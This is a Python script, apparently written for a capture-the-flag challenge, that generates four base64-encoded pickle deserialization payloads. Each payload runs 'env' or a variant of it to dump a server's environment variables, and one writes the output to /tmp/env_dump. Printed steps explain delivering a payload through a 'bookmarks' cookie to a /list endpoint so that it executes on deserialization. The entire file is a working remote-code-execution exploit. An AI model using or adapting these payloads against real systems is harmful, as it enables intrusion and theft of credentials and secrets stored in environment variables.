import pickle
import base64
import os
import subprocess

print("=" * 60)
print("Generating Pickle RCE Payload for Environment Variable Extraction")
print("=" * 60)

# Method 1: Execute env command directly (output to stdout/stderr)
class RCE_Environment:
    def __reduce__(self):
        # Execute env command when unpickled
        return (os.system, ('env 2>&1',))

payload1 = RCE_Environment()
pickled1 = pickle.dumps(payload1)
encoded1 = base64.b64encode(pickled1).decode()

print("\n[Payload 1] Direct env execution:")
print(f"Base64: {encoded1}")
print("Length:", len(encoded1))

# Method 2: Write env output to file (common CTF technique)
class RCE_WriteFile:
    def __reduce__(self):
        # Write env to /tmp/env_dump which might be accessible
        return (os.system, ('env > /tmp/env_dump 2>&1',))

payload2 = RCE_WriteFile()
pickled2 = pickle.dumps(payload2)
encoded2 = base64.b64encode(pickled2).decode()

print("\n[Payload 2] Write to /tmp/env_dump:")
print(f"Base64: {encoded2}")
print("Length:", len(encoded2))

# Method 3: Execute and capture output using subprocess
class RCE_CaptureOutput:
    def __reduce__(self):
        # Execute env and return output (might appear in response)
        return (subprocess.check_output, (['env'],))

payload3 = RCE_CaptureOutput()
pickled3 = pickle.dumps(payload3)
encoded3 = base64.b64encode(pickled3).decode()

print("\n[Payload 3] Capture output with subprocess:")
print(f"Base64: {encoded3}")
print("Length:", len(encoded3))

# Method 4: More stealthy - try to exfiltrate via echo (less likely to be filtered)
class RCE_EchoBased:
    def __reduce__(self):
        # Some apps log command output, this makes it more visible
        return (os.system, ('echo "===ENV_START===" && env && echo "===ENV_END==="',))

payload4 = RCE_EchoBased()
pickled4 = pickle.dumps(payload4)
encoded4 = base64.b64encode(pickled4).decode()

print("\n[Payload 4] Echo-wrapped env (easier to spot in logs):")
print(f"Base64: {encoded4}")
print("Length:", len(encoded4))

print("\n" + "=" * 60)
print("USAGE INSTRUCTIONS:")
print("=" * 60)
print("1. Set the bookmarks cookie to one of the payloads above")
print("2. Visit the /list endpoint")
print("3. The payload will execute when the cookie is deserialized")
print("4. Check the response, logs, or /tmp/env_dump for output")
print("\nRecommended payload: Payload 1 (simplest and most reliable)")
print("=" * 60)

